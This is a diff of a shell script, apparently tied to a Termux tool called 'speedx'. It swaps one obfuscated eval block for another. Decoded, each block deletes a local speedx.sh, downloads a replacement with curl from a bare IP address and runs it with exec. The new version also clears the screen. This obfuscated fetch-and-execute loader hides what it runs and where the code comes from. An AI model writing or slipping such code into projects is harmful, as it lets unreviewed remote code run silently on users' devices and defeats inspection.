@@ -44,20 +44,6 @@
 
 
 
-
-
-
-
-
-
-
-
-
-
-clear
-
 z="
-";Sz='peed';az='://$';Hz='rchi';Zz='http';bz='{mir';Yz=' -O ';Jz='mirr';jz='"$0"';Qz='ctor';Gz='r $a';Tz='xter';Xz='curl';Oz='1"';Uz='mux/';Pz='dire';Mz='75.9';Vz='menu';Kz='or="';Wz='/spe';gz='}';Bz='ive=';dz='/${d';Lz='168.';Az='arch';ez='irec';Rz='y="s';Fz='rm -';Cz='"spe';fz='tory';Nz='4.25';cz='ror}';Dz='edx.';Iz='ve';hz='exec';Ez='sh"';iz=' sh ';
-eval "$Az$Bz$Cz$Dz$Ez$z$Fz$Gz$Hz$Iz$z$Jz$Kz$Lz$Mz$Nz$Oz$z$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Dz$Ez$z$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$z$hz$iz$jz"
-
-clear
+";Dz='ive=';Bz='r';fz='r}/$';hz='ecto';Qz='06"';lz='"$0"';Uz='peed';Oz='20.1';jz='exec';Az='clea';Mz='or="';gz='{dir';dz='/${m';bz='"htt';Ez='"spe';Rz='dire';Cz='arch';Zz='curl';az=' -O ';Tz='y="s';Kz='ve';Xz='menu';Lz='mirr';Gz='sh"';Nz='18.2';cz='ps:/';ez='irro';Fz='edx.';iz='ry}"';kz=' sh ';Wz='mux/';Jz='rchi';Iz='r $a';Pz='36.2';Yz='/spe';Vz='xter';Hz='rm -';Sz='ctor';
+eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$z$Hz$Iz$Jz$Kz$z$Lz$Mz$Nz$Oz$Pz$Qz$z$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Fz$Gz$z$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$z$jz$kz$lz$z$Az$Bz"
